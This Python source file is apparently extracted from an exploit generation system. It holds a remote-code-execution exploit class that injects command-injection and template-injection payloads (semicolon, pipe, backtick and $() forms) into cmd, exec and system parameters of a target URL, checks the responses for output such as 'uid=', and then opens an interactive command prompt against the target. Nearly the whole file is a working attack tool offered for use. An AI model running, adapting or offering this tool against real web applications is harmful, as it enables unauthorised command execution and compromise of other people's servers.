"""
Remote Code Execution (RCE) Exploit Class
Extracted from HexStrike exploit generation system
"""

import requests
import sys
import subprocess
from urllib.parse import quote


class RCEExploit:
    """Remote Code Execution exploitation class"""

    def __init__(self, target_url):
        """
        Initialize RCE exploit

        Args:
            target_url: Base URL of target application
        """
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def test_rce(self, command="id"):
        """
        Test for RCE vulnerability

        Args:
            command: Command to execute for testing

        Returns:
            True if vulnerability found, False otherwise
        """
        print(f"[+] Testing RCE with command: {command}")

        # Common RCE payloads
        payloads = [
            # Command injection
            f"; {command}",
            f"| {command}",
            f"&& {command}",
            f"|| {command}",

            # Template injection
            f"${{{{{command}}}}}",
            f"{{{{{command}}}}}",

            # Deserialization payloads
            f"{command}",

            # OS command injection
            f"`{command}`",
            f"$({command})",
        ]

        for i, payload in enumerate(payloads):
            try:
                # Test GET parameters
                response = self.session.get(
                    self.target_url,
                    params={"cmd": payload, "exec": payload, "system": payload}
                )

                # Look for command output indicators
                if self._check_rce_indicators(response.text, command):
                    print(f"[+] RCE found with payload {i+1}: {payload}")
                    return True

                # Test POST data
                response = self.session.post(
                    self.target_url,
                    data={"cmd": payload, "exec": payload, "system": payload}
                )

                if self._check_rce_indicators(response.text, command):
                    print(f"[+] RCE found with POST payload {i+1}: {payload}")
                    return True

            except Exception as e:
                continue

        return False

    def _check_rce_indicators(self, response_text, command):
        """
        Check response for RCE indicators

        Args:
            response_text: HTTP response text
            command: Command that was executed

        Returns:
            True if indicators found, False otherwise
        """
        if command == "id":
            indicators = ["uid=", "gid=", "groups="]
        elif command == "whoami":
            indicators = ["root", "www-data", "apache", "nginx"]
        elif command == "pwd":
            indicators = ["/", "\\", "C:"]
        else:
            indicators = [command]

        return any(indicator in response_text for indicator in indicators)

    def execute_command(self, command):
        """
        Execute a specific command

        Args:
            command: Command to execute

        Returns:
            True if successful, False otherwise
        """
        print(f"[+] Executing command: {command}")

        if self.test_rce(command):
            print(f"[+] Command executed successfully")
            return True
        else:
            print(f"[-] Command execution failed")
            return False


def main():
    """Main execution function for standalone usage"""
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url> [command]")
        print(f"Example: python3 {sys.argv[0]} http://target.com id")
        sys.exit(1)

    target_url = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "id"

    exploit = RCEExploit(target_url)

    print(f"[+] RCE Exploit")
    print(f"[+] Target: {target_url}")

    if exploit.test_rce(command):
        print("[+] RCE vulnerability confirmed!")

        # Interactive shell
        while True:
            try:
                cmd = input("RCE> ").strip()
                if cmd.lower() in ['exit', 'quit']:
                    break
                if cmd:
                    exploit.execute_command(cmd)
            except KeyboardInterrupt:
                break
    else:
        print("[-] No RCE vulnerability found")


if __name__ == "__main__":
    main()
